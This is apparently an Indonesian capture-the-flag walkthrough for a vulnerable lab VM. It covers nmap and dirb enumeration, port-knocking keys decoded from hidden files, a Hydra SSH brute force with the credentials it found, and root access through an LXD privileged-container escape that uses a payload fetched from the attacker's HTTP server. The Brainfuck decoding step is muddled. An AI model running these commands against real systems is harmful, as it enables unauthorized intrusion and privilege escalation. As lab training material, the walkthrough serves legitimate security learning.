🔍 Information Gathering & Enumerasi Awal

Setelah mesin virtual di-import dan dinyalakan, langkah pertama adalah menemukan IP target dan memindai port yang terbuka.

# Temukan IP target
sudo netdiscover -r 192.168.56.0/24

# Scan port dengan Nmap
nmap -sC -sV -p- 192.168.56.103 Klik untuk copy
💡 Hasil Scan: Port 22 (SSH) berstatus filtered (tertutup dari luar), dan Port 80 (HTTP) terbuka. Ini mengindikasikan adanya mekanisme Port Knocking.

🌐 Enumerasi Web & Mencari Petunjuk

Buka browser dan akses http://192.168.56.103. Lakukan Directory Busting untuk mencari direktori atau file tersembunyi.

dirb http://192.168.56.103/ Klik untuk copy

Ditemukan beberapa direktori penting: /backup/, /config/, dan /css/. Cek juga source code halaman utama (Ctrl+U), di sana ada komentar tersembunyi:

<!-- "Please, jubiscleudo, don't forget to activate the port knocking when exiting your section..." --> Klik untuk copy

🔑 Mengumpulkan Kunci Port Knocking

Kita harus menemukan 3 port untuk melakukan Port Knocking.

1. Port Pertama (Base64)

Buka /config/1.txt. Isinya adalah string Base64 MTAwMDA=. Decode string tersebut:

echo "MTAwMDA=" | base64 -d Klik untuk copy

Hasilnya adalah 10000.

2. Port Kedua (Brainfuck)

Buka /css/2.txt. Isinya adalah kode Brainfuck: ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------..... Gunakan decoder online untuk menerjemahkannya. Hasilnya adalah 4444 (atau karakter '3' yang berulang).

3. Port Ketiga (Steganografi)

Di direktori /login_page/, terdapat file 3.jpg. Unduh dan ekstrak dengan steghide (tekan Enter saat diminta passphrase).

wget http://192.168.56.103/login_page/3.jpg
steghide extract -sf 3.jpg Klik untuk copy

Baca file hasil ekstraksi, di sana tertulis port ketiga: 65535.

🚪 Port Knocking & Brute Force SSH

Sekarang kita punya urutan portnya: 10000, 4444, 65535. Lakukan Port Knocking untuk membuka port SSH (22).

knock 192.168.56.103 10000 4444 65535
nmap -p 22 192.168.56.103 Klik untuk copy
✅ Berhasil: Port 22 sekarang berstatus open.

Selanjutnya, unduh wordlist dari direktori /backup/ dan lakukan brute force menggunakan Hydra dengan username jubiscleudo.

wget http://192.168.56.103/backup/wordlist.txt
hydra -l jubiscleudo -P wordlist.txt ssh://192.168.56.103 Klik untuk copy
✅ Kredensial SSH Ditemukan:
Username: jubiscleudo
Password: onlymy

🚩 User Flag & Lateral Movement

Login ke SSH menggunakan kredensial di atas.

ssh jubiscleudo@192.168.56.103 Klik untuk copy

Setelah masuk, cari file tersembunyi di direktori home. Kamu akan menemukan .user.txt (User Flag pertama).

ls -la
cat .user.txt Klik untuk copy

Selanjutnya, kita perlu mencari kredensial user lain. Periksa direktori web server:

ls -la /var/www/html/
cat /var/www/html/.backup_config.php Klik untuk copy

Di dalam file .backup_config.php, terdapat kredensial untuk user hackable_3.

Pindah ke user tersebut:

su hackable_3 Klik untuk copy

👑 Privilege Escalation (LXD Exploit)

Cek identitas user hackable_3 dengan perintah id. Kamu akan melihat bahwa user ini adalah anggota grup lxd. Ini adalah celah eskalasi privilege yang sangat ampuh.

1. Perbarui Sesi Grup

Karena kita baru saja pindah user, kita perlu mengaktifkan grup lxd di sesi terminal saat ini.

newgrp lxd Klik untuk copy

2. Build & Transfer Image Alpine

Di Kali Linux (bukan di SSH target), build image Alpine untuk LXD, lalu transfer ke target menggunakan Python HTTP Server.

# Di Kali Linux:
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

# Jalankan server HTTP
python3 -m http.server 8000 Klik untuk copy

Di terminal SSH target (masuk ke direktori /tmp), unduh file image tersebut:

cd /tmp
wget http://192.168.56.102:8000/alpine-v3.24-x86_64-*.tar.gz Klik untuk copy

3. Eksekusi LXD

Jalankan perintah berikut di terminal SSH target untuk membuat container dengan hak akses penuh dan me-mount direktori host.

lxd init --auto
lxc image import ./alpine-v3.24-x86_64-*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh Klik untuk copy

4. Ambil Root Flag

Setelah masuk ke dalam container (prompt berubah menjadi ~ #), akses direktori root host dan baca flag-nya.

cd /mnt/root/root
cat root.txt Klik untuk copy
